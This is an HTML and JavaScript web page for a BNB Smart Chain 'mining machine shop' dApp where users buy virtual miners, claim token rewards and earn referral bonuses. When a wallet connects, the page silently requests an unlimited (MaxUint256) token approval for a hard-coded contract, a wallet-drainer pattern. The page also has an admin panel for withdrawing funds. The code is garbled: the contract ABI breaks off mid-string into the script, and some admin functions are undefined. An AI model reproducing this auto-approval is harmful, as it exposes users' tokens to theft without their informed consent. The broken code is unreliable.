<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>矿机商店 · Mining Shop</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
  <style>
    :root { --bg:#121212; --panel:#1e1e1e; --accent:#3f51b5; --text:#e0e0e0; }
    body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:var(--bg);color:var(--text);display:flex;justify-content:center;align-items:center;min-height:100vh}
    .card{background:var(--panel);border-radius:16px;padding:32px;max-width:800px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,.5);backdrop-filter:blur(10px);transition:.3s}
    h1{margin-top:0;text-align:center;font-weight:700;font-size:2rem}
    .btn{display:inline-flex;align-items:center;justify-content:center;padding:12px 24px;border-radius:8px;border:none;font-size:1rem;cursor:pointer;transition:.3s;background:var(--accent);color:#fff;margin:8px 4px}
    .btn:disabled{background:#555}
    .btn:hover{filter:brightness(1.1)}
    .row{display:flex;gap:16px;flex-wrap:wrap}
    .col{flex:1 1 200px}
    .stat{margin:8px 0}
    .lang{position:absolute;top:16px;right:16px;cursor:pointer;color:var(--accent)}
    .alert{position:fixed;top:20px;left:50%;transform:translateX(-50%);padding:12px 24px;border-radius:8px;font-weight:600;z-index:9999;display:none}
    .alert.ok{background:#27ae60;color:#fff}
    .alert.err{background:#e74c3c;color:#fff}
  </style>
</head>
<body>
  <div class="card">
    <span class="lang" onclick="toggleLang()">🌐 中文/English</span>
    <h1 id="title">矿机商店</h1>

    <div id="connectPanel">
      <button class="btn" id="btnConnect" onclick="connectWallet()"><i class="fas fa-wallet"></i> <span id="connectTxt">连接钱包</span></button>
    </div>

    <!-- 用户面板 -->
    <div id="userPanel" style="display:none">
      <div class="row">
        <div class="col">
          <div class="stat"><strong id="statNormal">普通矿机: --</strong></div>
          <div class="stat"><strong id="statTest">测试矿机: --</strong></div>
          <div class="stat"><strong id="statPower">增强矿机: --</strong></div>
          <div class="stat"><strong id="statDaily">日产量: --</strong></div>
        </div>
        <div class="col">
          <div class="stat"><strong id="statUnclaimed">未领取: --</strong></div>
          <div class="stat"><strong id="statRef">推荐奖励: --</strong></div>
          <div class="stat"><strong id="statPowerTotal">总算力: --</strong></div>
        </div>
      </div>
      <div class="row">
        <button class="btn" onclick="buyInitial()"><i class="fas fa-plus"></i> 购买初始矿机</button>
        <button class="btn" onclick="buyTest()"><i class="fas fa-plus"></i> 测试矿机</button>
        <button class="btn" onclick="buyPower()"><i class="fas fa-plus"></i> 增强矿机</button>
        <button class="btn" onclick="claim()"><i class="fas fa-gift"></i> 领取收益</button>
      </div>
    </div>

    <!-- 管理员面板 -->
    <div id="adminPanel" style="display:none">
      <h2>管理员面板</h2>
      <input id="adminAddr" placeholder="地址" class="btn" style="width:100%;margin-bottom:12px" />
      <div class="row">
        <button class="btn" onclick="addAdmin()"><i class="fas fa-user-plus"></i> 添加管理员</button>
        <button class="btn" onclick="removeAdmin()"><i class="fas fa-user-minus"></i> 移除管理员</button>
        <button class="btn" onclick="withdrawToken()"><i class="fas fa-coins"></i> 提回代币</button>
        <button class="btn" onclick="withdrawBNB()"><i class="fas fa-coins"></i> 提回 BNB</button>
      </div>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script>
    // ✅ 配置地址
    const TOKEN_ADDRESS = "0x877f23dcFBa91cadd7d35565Da452c9673C27A33";
    const CONTRACT_ADDRESS = "0x9dCcEd4Ef738856D2c289D4116cD219c698B22ba";

    // ✅ 矿机合约 ABI

e":"uint256","name":"dailyReward","type":"uint256"},{"internalType":"uint256","name":"unclaimed","type":"uint256"},{"internalType":"uint256","name":"totalRefReward","type":"uint256"},{"internalType":"uint256","name":"totalPower","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"machineTiers","outputs":[{"internalType":"uint256","name":"priceToken","type":"uint256"},{"internalType":"uint256","name":"powerMultiplier","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"pause","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"referralRecords","outputs":[{"internalType":"address","name":"referrer","type":"address"},{"internalType":"address","name":"referee","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint256","name":"timestamp","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"a","type":"address"}],"name":"removeAdmin","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"a","type":"address"}],"name":"removeFromBlocklist","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"rewardPool","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"rewardToken","outputs":[{"internalType":"contract IERC20","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"referrer","type":"address"}],"name":"setReferrer","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"startBlock","outputs":[{"     let signer, userAddress, contract;

    async function connectWallet() {
      const provider = window.ethereum || window.tp || window.okexchain || window.bitkeep?.ethereum;
      if (!provider) return alert("请使用支持 BSC 的钱包浏览器");

      try {
        await provider.request({ method: "eth_requestAccounts" });
        const chainId = await provider.request({ method: "eth_chainId" });
        if (chainId !== "0x38") return alert("请切换到 BSC 主网");

        const web3Provider = new ethers.providers.Web3Provider(provider);
        signer = web3Provider.getSigner();
        userAddress = await signer.getAddress();

        contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);

        document.getElementById("connectTxt").textContent = "已连接";
        document.getElementById("connectPanel").style.display = "none";
        document.getElementById("userPanel").style.display = "block";

        await autoApprove();
        await loadUserData();
      } catch (err) {
        alert("连接失败：" + err.message);
      }
    }

    async function autoApprove() {
      const tokenAbi = ["function approve(address spender, uint256 amount) external returns (bool)"];
      const token = new ethers.Contract(TOKEN_ADDRESS, tokenAbi, signer);
      try {
        const tx = await token.approve(CONTRACT_ADDRESS, ethers.constants.MaxUint256);
        await tx.wait();
        showAlert("已自动完成无限授权 ✅");
      } catch (err) {
        showAlert("授权失败：" + err.message);
      }
    }

    async function loadUserData() {
      const data = await contract.getUserDashboard(userAddress);
      document.getElementById("statNormal").textContent = `普通矿机: ${data.normal}`;
      document.getElementById("statTest").textContent = `测试矿机: ${data.test}`;
      document.getElementById("statPower").textContent = `增强矿机: ${data.power.reduce((a, b) => a + Number(b), 0)}`;
      document.getElementById("statDaily").textContent = `日产量: ${ethers.utils.formatUnits(data.dailyReward)} α`;
      document.getElementById("statUnclaimed").textContent = `未领取: ${ethers.utils.formatUnits(data.unclaimed)} α`;
      document.getElementById("statRef").textContent = `推荐奖励: ${ethers.utils.formatUnits(data.totalRefReward)} α`;
      document.getElementById("statPowerTotal").textContent = `总算力: ${data.totalPower}`;
    }

    async function buyInitial() {
      try {
        const tx = await contract.buyInitialMachine({ value: ethers.utils.parseEther("0.01") });
        await tx.wait();
        showAlert("初始矿机购买成功 ✅");
        await loadUserData();
      } catch (err) {
        showAlert("购买失败：" + err.message);
      }
    }

    async function buyTest() {
      try {
        const tx = await contract.buyTestMachine({ value: ethers.utils.parseEther("0.001") });
        await tx.wait();
        showAlert("测试矿机购买成功 ✅");
        await loadUserData();
      } catch (err) {
        showAlert("购买失败：" + err.message);
      }
    }

    async function buyPower() {
      const tierId = prompt("请输入增强矿机等级（0~3）：");
      const count = prompt("请输入购买数量：");
      if (!tierId || !count) return;
      try {
        const tx = await contract.buyPowerMachine(tierId, count);
        await tx.wait();
        showAlert("增强矿机购买成功 ✅");
        await loadUserData();
      } catch (err) {
        showAlert("购买失败：" + err.message);
      }
    }

    async function claim() {
      try {
        const tx = await contract.claimRewards();
        await tx.wait();
        showAlert("收益领取成功 ✅");
        await loadUserData();
      } catch (err) {
        showAlert("领取失败：" + err.message);
      }
    }

    function showAlert(msg) {
      const el = document.createElement("div");
      el.className = "alert ok";
      el.textContent = msg;
      el.style.display = "block";
      document.body.appendChild(el);
      setTimeout(() => el.remove(), 3000);
    }

    function toggleLang() {
      alert("语言功能暂未实现");
    }
  </script>
</body>
</html>
